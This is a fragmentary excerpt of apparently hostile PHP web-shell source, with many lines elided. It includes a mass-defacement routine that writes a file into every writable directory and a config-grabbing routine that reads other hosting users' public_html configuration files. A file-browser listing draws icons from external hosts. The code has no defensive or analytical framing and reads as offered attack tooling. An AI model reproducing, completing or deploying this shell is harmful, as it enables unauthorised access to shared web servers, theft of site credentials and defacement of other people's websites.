...
$imgfol = "<img src='http://solevisible.com/icons/folder.png' class='ico'></img>";
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
  ...
  function tipe_biasa($dir,$namafile,$isi_script){if(is_writable($dir)){
      $dira = scandir($dir);
      foreach($dira as $dirb){
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
...
function aksiConfig($dir,$file){
  if($_POST){
    ...
    foreach($user_config[1] as $user_con){
      $user_config_dir = "/home/$user_con/public_html/";if(is_readable($user_config_dir)){
        $grab_config = array(
  ...
  if($d0mains){
    ...
    if($os != "Windows"){
      ...
      <div class='tmp'><table class='text-center table-responsive'>
        ...
        $file5 =fopen("test.txt","w");fputs($file5,$temp);
...
';
          ...
          foreach($scandir as $file){
            ...
            echo '<tr class="text-center">
              ...
              $ext = strtolower(pathinfo($file,PATHINFO_EXTENSION));if($ext == "php"){
                echo 'http://solevisible.com/icons/php.png';
              }elseif ($ext == "html"){
                echo 'https://raw.githubusercontent.com/sniper404ghostxploit/assets/main/indosec/html.png"';
              }elseif ($ext == "css"){
                echo 'http://solevisible.com/icons/css.png"';
              }elseif ($ext == "png"){
                echo 'http://solevisible.com/icons/png.png';
              }elseif ($ext == "jpg"){
                echo 'http://solevisible.com/icons/jpg.png';
              }elseif ($ext == "jpeg"){
                echo 'http://solevisible.com/icons/jpg.png"';
              }elseif($ext == "zip"){
                echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
              }elseif ($ext == "js"){
                echo 'http://solevisible.com/icons/js.png';
              }elseif ($ext == "ttf"){
                echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
              }elseif ($ext == "otf"){
                echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
              }elseif ($ext == "txt"){
                echo 'http://solevisible.com/icons/txt.png';
              }elseif ($ext == "ico"){
                echo 'http://solevisible.com/icons/ico.png';
              }elseif ($ext == "conf"){
                echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
              }elseif ($ext == "htaccess"){
                echo 'http://solevisible.com/icons/htaccess.png';
              }elseif ($ext == "sh"){
                ...
                echo 'http://solevisible.com/icons/notfound.png';
              }else{
                echo 'http://solevisible.com/icons/notfound.png';
              }
              echo '" class="ico2"></img>';
